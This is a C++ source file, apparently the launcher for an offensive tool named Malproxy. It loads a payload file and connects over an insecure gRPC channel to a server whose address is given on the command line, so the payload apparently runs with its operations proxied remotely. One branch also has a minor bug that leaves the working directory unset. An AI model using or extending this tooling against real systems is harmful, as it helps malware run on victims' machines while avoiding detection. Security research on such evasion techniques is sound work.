#include <cstdio>
#include "RpcLib/MalproxySession.h"
#include "Framework/Utils.h"
#include "MalproxyClientRunner.h"
#include "Framework/NtHelper.h"

enum args
{
	ARGV_SELF = 0,
	ARGV_PAYLOAD,
	ARGV_MALPROXY_SERVER_ADDRESS,
	ARGV_MALPROXY_SERVER_PORT,
	ARGV_PAYLOAD_PWD,
	ARGV_PAYLOAD_ARGS,
};

int usage(char* argv[])
{
	printf("Usage: %s <payload path> <server address> <server port>\n", argv[ARGV_SELF]);
	return -1;
}

int main(int argc, char* argv[])
{
	if (argc < ARGV_PAYLOAD_PWD)
		return usage(argv);

	//std::vector<char> buffer(1024 * 1024);
	//DWORD retsize = 0;
	//DWORD raw_retval = ((DWORD(*)(DWORD, LPVOID, DWORD, DWORD*))GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation"))(5, buffer.data(), (DWORD)buffer.size(), &retsize);
	//SYSTEM_PROCESS_INFORMATION* proc = (SYSTEM_PROCESS_INFORMATION*)buffer.data();

	std::string url = StringUtils::FormatString("%s:%s", argv[ARGV_MALPROXY_SERVER_ADDRESS], argv[ARGV_MALPROXY_SERVER_PORT]);
	std::shared_ptr<MalproxySession> client = std::make_shared<MalproxySession>();

	std::wstring payload_path = StringUtils::Utf8ToUtf16(argv[ARGV_PAYLOAD]);
	std::wstring pwd;
	std::wstring args;
	if (argc > ARGV_PAYLOAD_PWD)
	{
		pwd = StringUtils::Utf8ToUtf16(argv[ARGV_PAYLOAD_PWD]);
	}
	else
	{
		DWORD required_pwd_size = GetCurrentDirectoryW(0, nullptr);
		std::vector<wchar_t> pwd_buffer(required_pwd_size);
		GetCurrentDirectoryW(required_pwd_size, &pwd_buffer[0]);
	}

	if (argc > ARGV_PAYLOAD_ARGS)
		args = StringUtils::Utf8ToUtf16(argv[ARGV_PAYLOAD_ARGS]);

	client->Connect(url, grpc::InsecureChannelCredentials());

	MalproxyClientRunner::Init(client);
	MalproxyClientRunner::Instance().RunRemote(payload_path, pwd, args);
}
